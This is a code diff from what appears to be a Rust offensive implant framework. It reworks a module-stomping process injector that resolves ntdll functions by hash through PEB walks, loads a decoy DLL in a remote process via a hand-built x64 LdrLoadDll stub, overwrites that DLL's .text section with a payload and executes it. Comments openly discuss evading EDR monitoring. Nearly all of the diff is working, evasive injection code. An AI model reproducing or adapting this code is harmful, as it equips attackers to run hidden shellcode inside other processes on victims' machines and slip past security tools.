@@ -54,9 +54,7 @@ impl Injector for ModuleStompInjector {
                 return Err(anyhow!("Failed to open process"));
             }
 
-            // ── Resolve ntdll, LdrLoadDll, NtCreateThreadEx via PEB walk ────────
-            // Using pe_resolve crate for hash-based API resolution to avoid
-            // GetModuleHandleA / GetProcAddress showing up in the IAT.
+            // ── Resolve ntdll, LdrLoadDll, NtCreateThreadEx, NtQueryInformationProcess ──
             let ntdll_hash: u32 = pe_resolve::hash_str(b"ntdll.dll\0");
             let ntdll = pe_resolve::get_module_handle_by_hash(ntdll_hash)
                 .ok_or_else(|| anyhow!("ntdll not found via PEB walk"))?;
@@ -70,446 +68,45 @@ impl Injector for ModuleStompInjector {
                 .ok_or_else(|| anyhow!("NtCreateThreadEx not found"))?;
 
             type NtCreateThreadExFn = unsafe extern "system" fn(
-                ThreadHandle: *mut *mut winapi::ctypes::c_void,
-                DesiredAccess: u32,
-                ObjectAttributes: *mut winapi::ctypes::c_void,
-                ProcessHandle: *mut winapi::ctypes::c_void,
-                StartRoutine: *mut winapi::ctypes::c_void,
-                Argument: *mut winapi::ctypes::c_void,
-                CreateFlags: u32,
-                ZeroBits: usize,
-                StackSize: usize,
-                MaximumStackSize: usize,
-                AttributeList: *mut winapi::ctypes::c_void,
+                *mut *mut winapi::ctypes::c_void,
+                u32,
+                *mut winapi::ctypes::c_void,
+                *mut winapi::ctypes::c_void,
+                *mut winapi::ctypes::c_void,
+                *mut winapi::ctypes::c_void,
+                u32,
+                usize,
+                usize,
+                usize,
+                *mut winapi::ctypes::c_void,
             ) -> i32;
             let build_thread: NtCreateThreadExFn = std::mem::transmute(ntcreate_ptr);
 
-            // ── Build UNICODE_STRING + remote allocation for LdrLoadDll ─────────
-            // LdrLoadDll signature:
-            //   NTSTATUS LdrLoadDll(
-            //     PWSTR SearchPath,           // NULL = default
-            //     PULONG DllCharacteristics,   // NULL = default
-            //     PUNICODE_STRING ModuleFileName,
-            //     PVOID *BaseAddress
-            //   );
-
-            // Enumerate loaded modules via the PEB InLoadOrderModuleList to
-            // build a dynamic candidate list.  Only DLLs whose .text section is
-            // at least as large as the payload are eligible.  This avoids the
-            // static-string list of known stomping targets (msfte.dll, etc.) that
-            // EDR tools specifically monitor for out-of-process writes.
-            //
-            // PEB walk (x86-64): TEB @ gs:[0x30] → PEB @ TEB+0x60 →
-            // Ldr @ PEB+0x18 → InLoadOrderModuleList head @ Ldr+0x10.
-            // LDR_DATA_TABLE_ENTRY offsets (x86-64) when entry pointer is the
-            // InLoadOrderLinks.Flink (i.e. the entry's base address):
-            //   +0x00  InLoadOrderLinks.Flink
-            //   +0x30  DllBase
-            //   +0x58  BaseDllName.Length (u16, byte count)
-            //   +0x60  BaseDllName.Buffer (pointer to UTF-16)
-            //
-            // The x86_64 path uses gs:[0x30]; aarch64 uses mrs tpidr_el0.
-            // Both are guarded by target_arch to prevent compile errors on
-            // architectures that don't have these registers (H-20 fix).
-            #[cfg(target_arch = "x86_64")]
-            let target_dll: Option<String> = unsafe {
-                use core::arch::asm;
-                let teb: usize;
-                asm!("mov {}, gs:[0x30]", out(reg) teb);
-                let peb = *(teb as *const usize).add(12) as *const u8;
-                let ldr = *(peb.add(0x18) as *const usize) as *const u8;
-                let list_head = ldr.add(0x10) as usize;
-                let mut entry = *(list_head as *const usize) as *const u8;
-
-                let mut found: Option<String> = None;
-                while entry as usize != list_head {
-                    let base = *(entry.add(0x30) as *const usize); // DllBase
-                    let name_len = *(entry.add(0x58) as *const u16) as usize / 2; // BaseDllName.Length
-                    let name_ptr = *(entry.add(0x60) as *const usize) as *const u16; // BaseDllName.Buffer
-
-                    if base != 0 && !name_ptr.is_null() && name_len > 0 {
-                        let slice = std::slice::from_raw_parts(name_ptr, name_len);
-                        let name = String::from_utf16_lossy(slice);
-                        let lname = name.to_ascii_lowercase();
-
-                        let is_excluded = lname.starts_with("ntdll")
-                            || lname.starts_with("kernel32")
-                            || lname.starts_with("kernelbase")
-                            || lname.starts_with("agent")
-                            || lname.len() < 5;
-
-                        if !is_excluded {
-                            let dos = base as *const winapi::um::winnt::IMAGE_DOS_HEADER;
-                            if (*dos).e_magic == winapi::um::winnt::IMAGE_DOS_SIGNATURE {
-                                let nt = (base + (*dos).e_lfanew as usize)
-                                    as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
-                                let ns = (*nt).FileHeader.NumberOfSections as usize;
-                                let sec_base = nt as usize
-                                    + std::mem::size_of::<
-                                        winapi::um::winnt::IMAGE_NT_HEADERS64,
-                                    >();
-                                for i in 0..ns {
-                                    let sec = (sec_base
-                                        + i * std::mem::size_of::<
-                                            winapi::um::winnt::IMAGE_SECTION_HEADER,
-                                        >())
-                                        as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
-                                    let nm = std::ptr::addr_of!((*sec).Name);
-                                    let nm_bytes = &*(nm as *const [u8; 8]);
-                                    if nm_bytes.starts_with(b".text") {
-                                        if *(*sec).Misc.VirtualSize() as usize >= payload.len() {
-                                            found = Some(name);
-                                        }
-                                        break;
-                                    }
-                                }
-                            }
-                        }
-                    }
-
-                    if found.is_some() {
-                        break;
-                    }
-                    entry = *(entry as *const usize) as *const u8;
-                }
-                found
-            };
-
-            #[cfg(all(target_arch = "aarch64", target_os = "windows"))]
-            let target_dll: Option<String> = unsafe {
-                use core::arch::asm;
-                let teb: usize;
-                asm!("mrs {}, tpidr_el0", out(reg) teb, options(nostack, nomem));
-                let peb = *(teb as *const usize).add(12) as *const u8;
-                let ldr = *(peb.add(0x18) as *const usize) as *const u8;
-                let list_head = ldr.add(0x10) as usize;
-                let mut entry = *(list_head as *const usize) as *const u8;
-
-                let mut found: Option<String> = None;
-                while entry as usize != list_head {
-                    let base = *(entry.add(0x30) as *const usize);
-                    let name_len = *(entry.add(0x58) as *const u16) as usize / 2;
-                    let name_ptr = *(entry.add(0x60) as *const usize) as *const u16;
-
-                    if base != 0 && !name_ptr.is_null() && name_len > 0 {
-                        let slice = std::slice::from_raw_parts(name_ptr, name_len);
-                        let name = String::from_utf16_lossy(slice);
-                        let lname = name.to_ascii_lowercase();
-
-                        let is_excluded = lname.starts_with("ntdll")
-                            || lname.starts_with("kernel32")
-                            || lname.starts_with("kernelbase")
-                            || lname.starts_with("agent")
-                            || lname.len() < 5;
-
-                        if !is_excluded {
-                            let dos = base as *const winapi::um::winnt::IMAGE_DOS_HEADER;
-                            if (*dos).e_magic == winapi::um::winnt::IMAGE_DOS_SIGNATURE {
-                                let nt = (base + (*dos).e_lfanew as usize)
-                                    as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
-                                let ns = (*nt).FileHeader.NumberOfSections as usize;
-                                let sec_base = nt as usize
-                                    + std::mem::size_of::<
-                                        winapi::um::winnt::IMAGE_NT_HEADERS64,
-                                    >();
-                                for i in 0..ns {
-                                    let sec = (sec_base
-                                        + i * std::mem::size_of::<
-                                            winapi::um::winnt::IMAGE_SECTION_HEADER,
-                                        >())
-                                        as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
-                                    let nm = std::ptr::addr_of!((*sec).Name);
-                                    let nm_bytes = &*(nm as *const [u8; 8]);
-                                    if nm_bytes.starts_with(b".text") {
-                                        if *(*sec).Misc.VirtualSize() as usize >= payload.len() {
-                                            found = Some(name);
-                                        }
-                                        break;
-                                    }
-                                }
-                            }
-                        }
-                    }
-
-                    if found.is_some() {
-                        break;
-                    }
-                    entry = *(entry as *const usize) as *const u8;
-                }
-                found
-            };
-
-            // Fallback for architectures without a PEB walk implementation.
-            #[cfg(not(any(
-                target_arch = "x86_64",
-                all(target_arch = "aarch64", target_os = "windows")
-            )))]
-            let target_dll: Option<String> = None;
-            let target_dll = match target_dll {
-                Some(n) => n,
-                None => {
-                    CloseHandle(h_proc);
-                    return Err(anyhow!(
-                        "ModuleStompInjector: no loaded module with a .text \
-                         section large enough to accommodate the payload ({} bytes)",
-                        payload.len()
-                    ));
-                }
-            };
-            let wide: Vec<u16> = target_dll
-                .encode_utf16()
-                .chain(std::iter::once(0))
-                .collect();
-            let wide_bytes = wide.len() * 2;
-
-            // Layout in remote memory:
-            //   [0         .. wide_bytes]        : UTF-16 DLL name
-            //   [wide_bytes .. +16]              : UNICODE_STRING { Length, MaximumLength, Buffer (pointer) }
-            //   [wide_bytes+16 .. +8]            : BaseAddress output slot
-            let us_offset = wide_bytes;
-            let base_addr_offset = us_offset + 16;
-            let total_remote = base_addr_offset + 8;
-
-            let remote_buf = VirtualAllocEx(
-                h_proc,
-                std::ptr::null_mut(),
-                total_remote,
-                MEM_COMMIT | MEM_RESERVE,
-                PAGE_READWRITE,
-            );
-            if remote_buf.is_null() {
-                CloseHandle(h_proc);
-                return Err(anyhow!("VirtualAllocEx failed for LdrLoadDll args"));
-            }
-
-            // Write wide DLL name
-            let mut written = 0usize;
-            if WriteProcessMemory(
-                h_proc,
-                remote_buf,
-                wide.as_ptr() as _,
-                wide_bytes,
-                &mut written,
-            ) == 0
-            {
-                winapi::um::memoryapi::VirtualFreeEx(
-                    h_proc,
-                    remote_buf,
-                    0,
-                    winapi::um::winnt::MEM_RELEASE,
-                );
-                CloseHandle(h_proc);
-                return Err(anyhow!("WriteProcessMemory wide string failed"));
-            }
-
-            // Build UNICODE_STRING locally; Buffer = VA of remote_buf
-            let remote_us_ptr = (remote_buf as usize + us_offset) as *mut winapi::ctypes::c_void;
-            let remote_str_va = remote_buf as usize; // VA of the string in remote
-                                                     // UNICODE_STRING: Length(u16), MaximumLength(u16), _pad(u32), Buffer(*u16)
-            let mut us_bytes = [0u8; 16];
-            us_bytes[0..2].copy_from_slice(&((wide_bytes - 2) as u16).to_le_bytes()); // Length (no null)
-            us_bytes[2..4].copy_from_slice(&(wide_bytes as u16).to_le_bytes()); // MaximumLength
-                                                                                // bytes 4..8 = padding
-            us_bytes[8..16].copy_from_slice(&(remote_str_va as u64).to_le_bytes()); // Buffer pointer
-            if WriteProcessMemory(
-                h_proc,
-                remote_us_ptr,
-                us_bytes.as_ptr() as _,
-                16,
-                &mut written,
-            ) == 0
-            {
-                winapi::um::memoryapi::VirtualFreeEx(
-                    h_proc,
-                    remote_buf,
-                    0,
-                    winapi::um::winnt::MEM_RELEASE,
-                );
-                CloseHandle(h_proc);
-                return Err(anyhow!("WriteProcessMemory UNICODE_STRING failed"));
-            }
-
-            // Spawn remote thread calling LdrLoadDll(NULL, NULL, &us, &base_addr)
-            // We can't pass 4 structured args via NtCreateThreadEx's single Argument
-            // parameter.  Instead use a small remote stub that calls LdrLoadDll with
-            // the already-written UNICODE_STRING via a thread-local thunk approach:
-            // Simplest safe approach: write a minimal x64 stub.
-            //
-            // stub layout (x64):
-            //   sub rsp, 0x28            ; shadow space + align
-            //   xor rcx, rcx             ; SearchPath = NULL
-            //   xor rdx, rdx             ; DllCharacteristics = NULL
-            //   lea r8, [rip + us_delta] ; ModuleFileName = &UNICODE_STRING
-            //   lea r9, [rip + ba_delta] ; BaseAddress output
-            //   mov rax, <ldr_load_dll_abs>
-            //   call rax
-            //   add rsp, 0x28
-            //   ret
-            //
-            // We'll write stub + us + base_addr into a separate RWX region.
-
-            let ldr_addr = ldr_load_dll_ptr as u64;
-            let stub_region = VirtualAllocEx(
-                h_proc,
-                std::ptr::null_mut(),
-                256,
-                MEM_COMMIT | MEM_RESERVE,
-                PAGE_READWRITE,
-            );
-            if stub_region.is_null() {
-                winapi::um::memoryapi::VirtualFreeEx(
-                    h_proc,
-                    remote_buf,
-                    0,
-                    winapi::um::winnt::MEM_RELEASE,
-                );
-                CloseHandle(h_proc);
-                return Err(anyhow!("VirtualAllocEx failed for LdrLoadDll stub"));
-            }
-            let stub_va = stub_region as u64;
-            // Use remote_buf (already written) for the UNICODE_STRING args.
-            let us_va = remote_buf as u64;
-            let us_struct_va = us_va + us_offset as u64;
-            let base_out_va = us_va + base_addr_offset as u64;
-
-            // Build x64 stub
-            let mut stub = Vec::<u8>::with_capacity(64);
-            // sub rsp, 0x28
-            stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]);
-            // xor ecx, ecx
-            stub.extend_from_slice(&[0x33, 0xC9]);
-            // xor edx, edx
-            stub.extend_from_slice(&[0x33, 0xD2]);
-            // mov r8, <us_struct_va>
-            stub.extend_from_slice(&[0x49, 0xB8]);
-            stub.extend_from_slice(&us_struct_va.to_le_bytes());
-            // mov r9, <base_out_va>
-            stub.extend_from_slice(&[0x49, 0xB9]);
-            stub.extend_from_slice(&base_out_va.to_le_bytes());
-            // mov rax, <ldr_addr>
-            stub.extend_from_slice(&[0x48, 0xB8]);
-            stub.extend_from_slice(&ldr_addr.to_le_bytes());
-            // call rax
-            stub.extend_from_slice(&[0xFF, 0xD0]);
-            // add rsp, 0x28
-            stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]);
-            // ret
-            stub.push(0xC3);
-
-            if WriteProcessMemory(
-                h_proc,
-                stub_region,
-                stub.as_ptr() as _,
-                stub.len(),
-                &mut written,
-            ) == 0
-            {
-                winapi::um::memoryapi::VirtualFreeEx(
-                    h_proc,
-                    stub_region,
-                    0,
-                    winapi::um::winnt::MEM_RELEASE,
-                );
-                winapi::um::memoryapi::VirtualFreeEx(
-                    h_proc,
-                    remote_buf,
-                    0,
-                    winapi::um::winnt::MEM_RELEASE,
-                );
-                CloseHandle(h_proc);
-                return Err(anyhow!("WriteProcessMemory LdrLoadDll stub failed"));
-            }
-
-            // Switch stub memory from RW to RX now that all bytes are written.
-            let mut _old_prot = 0u32;
-            winapi::um::memoryapi::VirtualProtectEx(
-                h_proc,
-                stub_region,
-                stub.len(),
-                winapi::um::winnt::PAGE_EXECUTE_READ,
-                &mut _old_prot,
-            );
-
-            let mut h_thread: *mut winapi::ctypes::c_void = std::ptr::null_mut();
-            let status = build_thread(
-                &mut h_thread,
-                0x1FFFFF,
-                std::ptr::null_mut(),
-                h_proc,
-                stub_region,
-                std::ptr::null_mut(),
-                0,
-                0,
-                0,
-                0,
-                std::ptr::null_mut(),
-            );
-            if status >= 0 && !h_thread.is_null() {
-                winapi::um::synchapi::WaitForSingleObject(h_thread, winapi::um::winbase::INFINITE);
-                CloseHandle(h_thread);
-                // Free the stub region and remote argument buffer now that LdrLoadDll has returned.
-                winapi::um::memoryapi::VirtualFreeEx(
-                    h_proc,
-                    stub_region,
-                    0,
-                    winapi::um::winnt::MEM_RELEASE,
-                );
-                winapi::um::memoryapi::VirtualFreeEx(
-                    h_proc,
-                    remote_buf,
-                    0,
-                    winapi::um::winnt::MEM_RELEASE,
-                );
-            } else {
-                winapi::um::memoryapi::VirtualFreeEx(
-                    h_proc,
-                    stub_region,
-                    0,
-                    winapi::um::winnt::MEM_RELEASE,
-                );
-                winapi::um::memoryapi::VirtualFreeEx(
-                    h_proc,
-                    remote_buf,
-                    0,
-                    winapi::um::winnt::MEM_RELEASE,
-                );
-                CloseHandle(h_proc);
-                return Err(anyhow!(
-                    "NtCreateThreadEx for LdrLoadDll stub failed: {:x}",
-                    status
-                ));
-            }
-
-            // ── Find stomped module base via remote PEB walk ──────────────────
-            // Read target process PEB base from its TEB (NtQueryInformationProcess
-            // would need the syscall; simpler: read PBI via ReadProcessMemory
-            // from PROCESS_BASIC_INFORMATION via already-held h_proc).
-            // Use NtQueryInformationProcess (resolved via PEB walk) to get PEB addr.
             type NtQueryInfoProcess = unsafe extern "system" fn(
-                ProcessHandle: winapi::shared::ntdef::HANDLE,
-                ProcessInformationClass: u32,
-                ProcessInformation: *mut winapi::ctypes::c_void,
-                ProcessInformationLength: u32,
-                ReturnLength: *mut u32,
+                winapi::shared::ntdef::HANDLE,
+                u32,
+                *mut winapi::ctypes::c_void,
+                u32,
+                *mut u32,
             ) -> i32;
             let ntqip_hash = pe_resolve::hash_str(b"NtQueryInformationProcess\0");
             let ntqip_ptr = pe_resolve::get_proc_address_by_hash(ntdll, ntqip_hash)
                 .ok_or_else(|| anyhow!("NtQueryInformationProcess not found"))?;
             let ntqip: NtQueryInfoProcess = std::mem::transmute(ntqip_ptr);
 
-            // ProcessBasicInformation = 0; layout first field is ExitStatus(u32),
-            // then PebBaseAddress at offset 8 (pointer-sized).
+            // ── Get target process PEB address ──────────────────────────────
             let mut pbi = [0u8; 48];
             let mut ret_len = 0u32;
             ntqip(h_proc, 0, pbi.as_mut_ptr() as _, 48, &mut ret_len);
             let peb_addr = u64::from_le_bytes(pbi[8..16].try_into().unwrap()) as usize;
-
             if peb_addr == 0 {
                 CloseHandle(h_proc);
                 return Err(anyhow!("Failed to get target PEB address"));
             }
 
-            // PEB.Ldr is at offset 0x18 (x64)
+            // ── Walk TARGET process PEB to find a suitable already-loaded DLL ──
+            // H-19 fix: previously this walked the LOCAL process PEB via gs:[0x30]
+            // which had no relationship to the modules loaded in the remote target.
             let mut ldr_ptr = 0usize;
             let mut bytes_read = 0usize;
             ReadProcessMemory(
@@ -521,11 +118,10 @@ impl Injector for ModuleStompInjector {
             );
             if ldr_ptr == 0 {
                 CloseHandle(h_proc);
-                return Err(anyhow!("Failed to read Ldr pointer"));
+                return Err(anyhow!("Failed to read target Ldr pointer"));
             }
 
-            // PEB_LDR_DATA.InLoadOrderModuleList is at offset 0x10
-            let list_head = ldr_ptr + 0x10;
+            let list_head = ldr_ptr + 0x10; // InLoadOrderModuleList
             let mut flink = 0usize;
             ReadProcessMemory(
                 h_proc,
@@ -535,16 +131,11 @@ impl Injector for ModuleStompInjector {
                 &mut bytes_read,
             );
 
-            let target_lower = target_dll.to_lowercase();
+            let mut target_dll_name: Option<String> = None;
             let mut target_base: usize = 0;
             let mut current = flink;
 
             while current != list_head && current != 0 {
-                // LDR_DATA_TABLE_ENTRY (InLoadOrder):
-                //   +0x00: Flink, +0x08: Blink
-                //   +0x30: DllBase
-                //   +0x48: FullDllName UNICODE_STRING (Length u16 +0, MaxLen u16 +2, Buffer *u16 +8)
-                //   +0x58: BaseDllName UNICODE_STRING
                 let mut entry = [0u8; 0x70];
                 if ReadProcessMemory(
                     h_proc,
@@ -569,13 +160,62 @@ impl Injector for ModuleStompInjector {
                         name_len,
                         &mut bytes_read,
                     );
-                    let name_str = String::from_utf16_lossy(&name_wide).to_lowercase();
-                    if name_str.contains(&target_lower)
-                        || name_str.trim_end_matches('\0').contains(&target_lower)
-                    {
-                        target_base = dll_base;
-                        break;
+                    let name_str = String::from_utf16_lossy(&name_wide);
+                    let lname = name_str.to_ascii_lowercase();
+
+                    let is_excluded = lname.starts_with("ntdll")
+                        || lname.starts_with("kernel32")
+                        || lname.starts_with("kernelbase")
+                        || lname.starts_with("agent")
+                        || lname.len() < 5;
+
+                    if !is_excluded {
+                        // Read PE headers from TARGET process to check .text size.
+                        let mut dos_header: IMAGE_DOS_HEADER = std::mem::zeroed();
+                        ReadProcessMemory(
+                            h_proc,
+                            dll_base as _,
+                            &mut dos_header as *mut _ as _,
+                            size_of::<IMAGE_DOS_HEADER>(),
+                            &mut bytes_read,
+                        );
+                        if dos_header.e_magic == winapi::um::winnt::IMAGE_DOS_SIGNATURE {
+                            let nt_addr = dll_base + dos_header.e_lfanew as usize;
+                            let mut nt_headers: IMAGE_NT_HEADERS64 = std::mem::zeroed();
+                            ReadProcessMemory(
+                                h_proc,
+                                nt_addr as _,
+                                &mut nt_headers as *mut _ as _,
+                                size_of::<IMAGE_NT_HEADERS64>(),
+                                &mut bytes_read,
+                            );
+                            let ns = nt_headers.FileHeader.NumberOfSections as usize;
+                            let sec_base = nt_addr
+                                + std::mem::offset_of!(IMAGE_NT_HEADERS64, OptionalHeader)
+                                + nt_headers.FileHeader.SizeOfOptionalHeader as usize;
+                            for i in 0..ns {
+                                let mut sec: IMAGE_SECTION_HEADER = std::mem::zeroed();
+                                ReadProcessMemory(
+                                    h_proc,
+                                    (sec_base + i * size_of::<IMAGE_SECTION_HEADER>()) as _,
+                                    &mut sec as *mut _ as _,
+                                    size_of::<IMAGE_SECTION_HEADER>(),
+                                    &mut bytes_read,
+                                );
+                                if &sec.Name[..5] == b".text" {
+                                    if *sec.Misc.VirtualSize() as usize >= payload.len() {
+                                        target_dll_name = Some(name_str);
+                                        target_base = dll_base;
+                                    }
+                                    break;
+                                }
+                            }
+                        }
                     }
+                }
+
+                if target_dll_name.is_some() {
+                    break;
                 }
                 let next_flink = u64::from_le_bytes(entry[0..8].try_into().unwrap()) as usize;
                 if next_flink == current {
@@ -584,10 +224,254 @@ impl Injector for ModuleStompInjector {
                 current = next_flink;
             }
 
+            // ── If no suitable DLL found, load one via LdrLoadDll ──────────
             if target_base == 0 {
-                CloseHandle(h_proc);
-                return Err(anyhow!("Failed to find loaded target DLL for stomping"));
+                // Hardcoded candidate list: DLLs commonly available on Windows
+                // with large .text sections that are safe to stomp.
+                let candidates = [
+                    "msfte.dll",
+                    "mshtml.dll",
+                    "msxml3.dll",
+                    "iertutil.dll",
+                    "clrjit.dll",
+                ];
+                let mut loaded_ok = false;
+
+                for &candidate in &candidates {
+                    let wide: Vec<u16> = candidate
+                        .encode_utf16()
+                        .chain(std::iter::once(0))
+                        .collect();
+                    let wide_bytes = wide.len() * 2;
+                    let us_offset = wide_bytes;
+                    let base_addr_offset = us_offset + 16;
+                    let total_remote = base_addr_offset + 8;
+
+                    let remote_buf = VirtualAllocEx(
+                        h_proc,
+                        std::ptr::null_mut(),
+                        total_remote,
+                        MEM_COMMIT | MEM_RESERVE,
+                        PAGE_READWRITE,
+                    );
+                    if remote_buf.is_null() {
+                        continue;
+                    }
+
+                    let mut written = 0usize;
+                    if WriteProcessMemory(
+                        h_proc,
+                        remote_buf,
+                        wide.as_ptr() as _,
+                        wide_bytes,
+                        &mut written,
+                    ) == 0
+                    {
+                        winapi::um::memoryapi::VirtualFreeEx(
+                            h_proc,
+                            remote_buf,
+                            0,
+                            winapi::um::winnt::MEM_RELEASE,
+                        );
+                        continue;
+                    }
+
+                    let remote_us_ptr =
+                        (remote_buf as usize + us_offset) as *mut winapi::ctypes::c_void;
+                    let remote_str_va = remote_buf as usize;
+                    let mut us_bytes = [0u8; 16];
+                    us_bytes[0..2]
+                        .copy_from_slice(&((wide_bytes - 2) as u16).to_le_bytes());
+                    us_bytes[2..4].copy_from_slice(&(wide_bytes as u16).to_le_bytes());
+                    us_bytes[8..16]
+                        .copy_from_slice(&(remote_str_va as u64).to_le_bytes());
+                    if WriteProcessMemory(
+                        h_proc,
+                        remote_us_ptr,
+                        us_bytes.as_ptr() as _,
+                        16,
+                        &mut written,
+                    ) == 0
+                    {
+                        winapi::um::memoryapi::VirtualFreeEx(
+                            h_proc,
+                            remote_buf,
+                            0,
+                            winapi::um::winnt::MEM_RELEASE,
+                        );
+                        continue;
+                    }
+
+                    // Build x64 stub for LdrLoadDll
+                    let stub_region = VirtualAllocEx(
+                        h_proc,
+                        std::ptr::null_mut(),
+                        256,
+                        MEM_COMMIT | MEM_RESERVE,
+                        PAGE_READWRITE,
+                    );
+                    if stub_region.is_null() {
+                        winapi::um::memoryapi::VirtualFreeEx(
+                            h_proc,
+                            remote_buf,
+                            0,
+                            winapi::um::winnt::MEM_RELEASE,
+                        );
+                        continue;
+                    }
+
+                    let ldr_addr = ldr_load_dll_ptr as u64;
+                    let us_va = remote_buf as u64;
+                    let us_struct_va = us_va + us_offset as u64;
+                    let base_out_va = us_va + base_addr_offset as u64;
+
+                    let mut stub = Vec::<u8>::with_capacity(64);
+                    stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]); // sub rsp, 0x28
+                    stub.extend_from_slice(&[0x33, 0xC9]); // xor ecx, ecx
+                    stub.extend_from_slice(&[0x33, 0xD2]); // xor edx, edx
+                    stub.extend_from_slice(&[0x49, 0xB8]); // mov r8, <us_struct_va>
+                    stub.extend_from_slice(&us_struct_va.to_le_bytes());
+                    stub.extend_from_slice(&[0x49, 0xB9]); // mov r9, <base_out_va>
+                    stub.extend_from_slice(&base_out_va.to_le_bytes());
+                    stub.extend_from_slice(&[0x48, 0xB8]); // mov rax, <ldr_addr>
+                    stub.extend_from_slice(&ldr_addr.to_le_bytes());
+                    stub.extend_from_slice(&[0xFF, 0xD0]); // call rax
+                    stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]); // add rsp, 0x28
+                    stub.push(0xC3); // ret
+
+                    if WriteProcessMemory(
+                        h_proc,
+                        stub_region,
+                        stub.as_ptr() as _,
+                        stub.len(),
+                        &mut written,
+                    ) == 0
+                    {
+                        winapi::um::memoryapi::VirtualFreeEx(
+                            h_proc,
+                            stub_region,
+                            0,
+                            winapi::um::winnt::MEM_RELEASE,
+                        );
+                        winapi::um::memoryapi::VirtualFreeEx(
+                            h_proc,
+                            remote_buf,
+                            0,
+                            winapi::um::winnt::MEM_RELEASE,
+                        );
+                        continue;
+                    }
+
+                    let mut _old_prot = 0u32;
+                    winapi::um::memoryapi::VirtualProtectEx(
+                        h_proc,
+                        stub_region,
+                        stub.len(),
+                        winapi::um::winnt::PAGE_EXECUTE_READ,
+                        &mut _old_prot,
+                    );
+
+                    let mut h_thread: *mut winapi::ctypes::c_void = std::ptr::null_mut();
+                    let status = build_thread(
+                        &mut h_thread,
+                        0x1FFFFF,
+                        std::ptr::null_mut(),
+                        h_proc,
+                        stub_region,
+                        std::ptr::null_mut(),
+                        0,
+                        0,
+                        0,
+                        0,
+                        std::ptr::null_mut(),
+                    );
+                    if status >= 0 && !h_thread.is_null() {
+                        winapi::um::synchapi::WaitForSingleObject(
+                            h_thread,
+                            winapi::um::winbase::INFINITE,
+                        );
+                        CloseHandle(h_thread);
+                    }
+                    winapi::um::memoryapi::VirtualFreeEx(
+                        h_proc,
+                        stub_region,
+                        0,
+                        winapi::um::winnt::MEM_RELEASE,
+                    );
+                    winapi::um::memoryapi::VirtualFreeEx(
+                        h_proc,
+                        remote_buf,
+                        0,
+                        winapi::um::winnt::MEM_RELEASE,
+                    );
+
+                    // Re-walk target PEB to find the newly loaded DLL.
+                    let mut flink2 = 0usize;
+                    ReadProcessMemory(
+                        h_proc,
+                        list_head as _,
+                        &mut flink2 as *mut _ as _,
+                        8,
+                        &mut bytes_read,
+                    );
+                    let mut cur2 = flink2;
+                    while cur2 != list_head && cur2 != 0 {
+                        let mut ent = [0u8; 0x70];
+                        if ReadProcessMemory(
+                            h_proc,
+                            cur2 as _,
+                            ent.as_mut_ptr() as _,
+                            ent.len(),
+                            &mut bytes_read,
+                        ) == 0
+                        {
+                            break;
+                        }
+                        let db =
+                            u64::from_le_bytes(ent[0x30..0x38].try_into().unwrap()) as usize;
+                        let nl =
+                            u16::from_le_bytes(ent[0x48..0x4A].try_into().unwrap()) as usize;
+                        let nb =
+                            u64::from_le_bytes(ent[0x50..0x58].try_into().unwrap()) as usize;
+                        if db != 0 && nl > 0 && nb != 0 {
+                            let mut nw = vec![0u16; nl / 2];
+                            ReadProcessMemory(
+                                h_proc,
+                                nb as _,
+                                nw.as_mut_ptr() as _,
+                                nl,
+                                &mut bytes_read,
+                            );
+                            let ns = String::from_utf16_lossy(&nw).to_lowercase();
+                            if ns.contains(&candidate.to_lowercase()) {
+                                target_dll_name = Some(candidate.to_string());
+                                target_base = db;
+                                loaded_ok = true;
+                                break;
+                            }
+                        }
+                        let nxt =
+                            u64::from_le_bytes(ent[0..8].try_into().unwrap()) as usize;
+                        if nxt == cur2 {
+                            break;
+                        }
+                        cur2 = nxt;
+                    }
+                    if loaded_ok {
+                        break;
+                    }
+                }
+
+                if target_base == 0 {
+                    CloseHandle(h_proc);
+                    return Err(anyhow!(
+                        "ModuleStompInjector: no loaded module with a .text section large enough to accommodate the payload ({} bytes)",
+                        payload.len()
+                    ));
+                }
             }
+
+            let _ = target_dll_name; // unused after selection; kept for diagnostics
 
             // ── Find .text section of target DLL ─────────────────────────────
             let mut dos_header: IMAGE_DOS_HEADER = std::mem::zeroed();
@@ -649,8 +533,10 @@ impl Injector for ModuleStompInjector {
                 return Err(anyhow!("Payload larger than target .text section"));
             }
 
+            // ── Stomp .text section and execute ────────────────────────────
             let target_addr = (target_base + text_rva as usize) as *mut winapi::ctypes::c_void;
             let mut old_protect = 0u32;
+            let mut written = 0usize;
             VirtualProtectEx(
                 h_proc,
                 target_addr,
@@ -672,8 +558,6 @@ impl Injector for ModuleStompInjector {
                 PAGE_EXECUTE_READ,
                 &mut old_protect,
             );
-            // Flush the instruction cache so the CPU picks up the newly written
-            // shellcode bytes (L-04 fix).
             winapi::um::processthreadsapi::FlushInstructionCache(
                 h_proc,
                 target_addr,
